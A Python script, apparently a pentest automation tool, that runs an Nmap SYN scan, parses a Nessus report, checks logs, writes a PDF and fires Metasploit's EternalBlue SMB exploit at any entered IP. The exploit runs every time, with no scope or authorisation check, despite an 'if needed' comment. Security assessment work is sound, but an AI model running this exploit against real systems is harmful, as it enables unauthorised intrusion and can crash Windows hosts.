import subprocess
import xml.etree.ElementTree as ET
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import os

# Run Nmap Scan
def run_nmap_scan(target):
    print(f"Running Nmap scan on {target}...")
    command = ["nmap", "-sS", target]  # Example: SYN scan for open ports
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode()

# Parse Nessus Report (XML)
def parse_nessus_report(file_path):
    print(f"Parsing Nessus report from {file_path}...")
    if not os.path.exists(file_path):
        print(f"Error: {file_path} does not exist.")
        return []

    tree = ET.parse(file_path)
    root = tree.getroot()
    vulnerabilities = []

    for vuln in root.findall(".//ReportItem"):
        vuln_name = vuln.find("pluginName").text
        vuln_severity = vuln.find("severity").text
        vulnerabilities.append((vuln_name, vuln_severity))
    return vulnerabilities

# Run Metasploit Exploit
def run_metasploit_exploit(target_ip):
    print(f"Running Metasploit exploit on {target_ip}...")
    command = [
        "msfconsole", "-q", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; run"
    ]
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode()
    # Analyze Logs
def analyze_log(file_path):
    print(f"Analyzing log file at {file_path}...")
    if not os.path.exists(file_path):
        print(f"Error: {file_path} does not exist.")
        return []

    with open(file_path, 'r') as f:
        logs = f.readlines()
    
    error_logs = [line for line in logs if "error" in line.lower()]
    return error_logs

# Generate PDF Report
def generate_pdf_report(filename, content):
    print(f"Generating PDF report: {filename}...")
    c = canvas.Canvas(filename, pagesize=letter)
    width, height = letter
    c.drawString(100, height - 100, content)
    c.save()

# Main function that automates the VAPT process
def automate_vapt(target_ip, nessus_report_path, log_file_path, pdf_output):
    print("Starting automated VAPT process...")

    # 1. Run Nmap scan
    nmap_result = run_nmap_scan(target_ip)
    print(f"Nmap scan result for {target_ip}:\n{nmap_result}\n")

    # 2. Parse Nessus report (if provided)
    vulnerabilities = parse_nessus_report(nessus_report_path)
    if vulnerabilities:
        print("Nessus Vulnerabilities:")
        for vuln in vulnerabilities:
            print(f"{vuln[0]} - Severity: {vuln[1]}")
    else:
        print("No vulnerabilities found in the Nessus report.")
          # 3. Run Metasploit exploit (if needed)
    exploit_result = run_metasploit_exploit(target_ip)
    print(f"Metasploit exploit result for {target_ip}:\n{exploit_result}\n")

    # 4. Analyze Logs
    errors = analyze_log(log_file_path)
    if errors:
        print("Log Errors found:")
        for error in errors:
            print(error)
    else:
        print("No errors found in the logs.")

    # 5. Generate PDF Report
    pdf_content = f"Nmap Scan Result:\n{nmap_result}\n\n"
    pdf_content += f"Nessus Vulnerabilities: {vulnerabilities}\n\n"
    pdf_content += f"Metasploit Exploit Result: {exploit_result}\n\n"
    pdf_content += f"Log Errors: {errors}\n"

    generate_pdf_report(pdf_output, pdf_content)
    print(f"PDF report generated: {pdf_output}\n")

# Main Script Entry Point
if __name__ == "__main__":
    # Take IP address input from the user
    target_ip = input("Enter the target IP address for VAPT: ")

    # Provide paths for the Nessus report and log file (you can modify these paths)
    nessus_report_path = input("Enter the full path to the Nessus report (e.g., /path/to/nessus_report.xml): ")
    log_file_path = input("Enter the full path to the log file (e.g., /path/to/log_file.log): ")
    
    # Output PDF file
    pdf_output = input("Enter the name for the PDF report (e.g., vapt_report.pdf): ")
    
    # Run the automated VAPT process
    automate_vapt(target_ip, nessus_report_path, log_file_path, pdf_output)



